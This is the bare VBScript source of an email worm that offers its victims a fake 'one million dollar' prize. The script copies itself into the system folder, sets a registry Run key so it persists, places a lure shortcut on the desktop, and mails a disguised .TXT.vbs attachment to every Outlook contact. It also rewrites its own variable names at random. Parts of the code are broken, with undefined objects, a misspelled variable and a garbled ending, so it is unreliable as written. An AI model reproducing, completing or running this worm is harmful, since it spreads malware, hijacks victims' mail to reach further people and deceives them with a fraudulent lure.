On Error Resume Next
Dim fso,dirsystem,file,vbscopy,dow,reg,FileLoc,MakeCopy,Lists,a,x,RegLists,Entries,Addresses,RegAddress,Mail
Set fso = CreateObject("Scripting.FileSystemObject")
Set reg = CreateObject("WScript.Shell")
Set dirsystem = fso.GetSpecialFolder(1)
Set file = fso.OpenTextFile(WScript.ScriptFullname,1)
Set MakeCopy = fso.GetFile(WScript.ScriptFullName)
Set OutLook=WScript.CreateObject("Outlook.Application")
Set mapi=OutLook.GetNameSpace("MAPI")
vbscopy=file.ReadAll
MakeCopy.Copy(dirsystem&"\Yellow.vbs")
FileLoc = dirsystem&"\Yellow.vbs"
reg.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Yellow.vbs", FileLoc
L_Welcome_MsgBox_Message_Text   = "Price are here"
L_Welcome_MsgBox_Title_Text     = "Price"
Call Welcome()
Dim WSHShell
Set WSHShell = WScript.CreateObject("WScript.Shell")
Dim MyShortcut, MyDesktop, DesktopPath
DesktopPath = WSHShell.SpecialFolders("Desktop")
Set MyShortcut = WSHShell.CreateShortcut(DesktopPath & "\Price.lnk")
MyShortcut.TargetPath = WSHShell.ExpandEnvironmentStrings("windows\exit to dos")
MyShortcut.WorkingDirectory = WSHShell.ExpandEnvironmentStrings("%windir%")
MyShortcut.WindowStyle = 4
MyShortcut.IconLocation = WSHShell.ExpandEnvironmentStrings("C:\Program Files\Plus!\Themes\Lucky2000.ico, 0")
MyShortcut.Save
MYShortcut.Save
MYShortcut.Save 
MYShortcut.Save
MYShortcut.Save
MYShortcut.Save
MYShortcut.Save
MYShortcut.Save
WScript.Echo "CLICK THE BLUE BOTTLE ICON ON THE DESKTOP AND YOU WIN ONE MILLION DOLLAR !!!                       "
AdCount = AddList.AddressEntries.Count
For AddListCount = 1 To AdCount
x=1
RegLists=reg.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
If (RegLists="") then
RegLists=1
End if
If (int(a.AddressEntries.Count)>int(RegLists)) then
For Entries=1 to a.AddressEntries.Count
Addresses=a.AddressEntries(x)
RegAddress=""
RegAddress=reg.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&Addresses)
If (RegAddresses="") then
Set Mail=OutLook.CreateItem(0)
Mail.Recipients.Add(Addresses)
Mail.Subject = "Won_a_Price"
Mail.Body = vbcrlf & "One Million Dollar for you."& vbcrlf & "Lucky2000"
Mail.Attachments.Add(dirsystem&"\Won_a_Price.TXT.vbs")
Mail.Send
reg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&Addresses,1,"REG_DWORD"
End if
x=x+1
Next
reg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
Else
reg.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
End if
Next
Set FSObject = CreateObject("Scripting.FileSystemObject")
Set ScriptFile = FSObject.OpenTextFile(WScript.ScriptFullName, 1)
OurCode = ScriptFile.Readall
AllVariables = "FSObject ScriptFile OurCode AllVariables VarLoop CurVar NewVar VarPos "
Do
CurVar = Left(AllVariables, InStr(AllVariables, Chr(32)) - 1)
AllVariables = Mid(AllVariables, InStr(AllVariables, Chr(32)) + 1)
NewVar = Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65))
Do
VarPos = InStr(VarPos + 1, OurCode, CurVar)
If VarPos Then OurCode = Mid(OurCode, 1, (VarPos - 1)) & NewVar & Mid(OurCode, (VarPos + Len(CurVar)))
Loop While VarPos
Loop While AllVariables <> ""
Set ScriptFile = FSObject.OpenTextFile(WScript.ScriptFullName, 2, True) '
ScriptFile.Writeline OurCode
Sub Welcome()
    Dim intDoIt

    intDoIt =  MsgBox(L_Welcome_MsgBox_Message_Text,    _
                      vbOKCancel + vbInformation,       _
                      L_Welcome_MsgBox_Title_Text )
    If intDoIt = vbCancel Then
        WScript.Quit
End SubRandomize
